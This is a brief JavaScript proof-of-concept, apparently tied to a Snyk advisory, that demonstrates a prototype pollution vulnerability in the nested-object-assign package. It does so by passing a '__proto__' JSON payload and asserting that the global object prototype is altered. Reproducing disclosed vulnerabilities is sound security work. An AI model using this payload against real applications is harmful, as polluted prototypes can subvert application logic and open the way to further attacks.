//https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977

const { assert } = require('@firebase/util')
const assign = require('nested-object-assign')
console.log('Before: ' + {}.polluted)
assign({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'))

console.log('After: ' + {}.polluted)
assert({}.polluted === "yes");
console.log("payload success!");

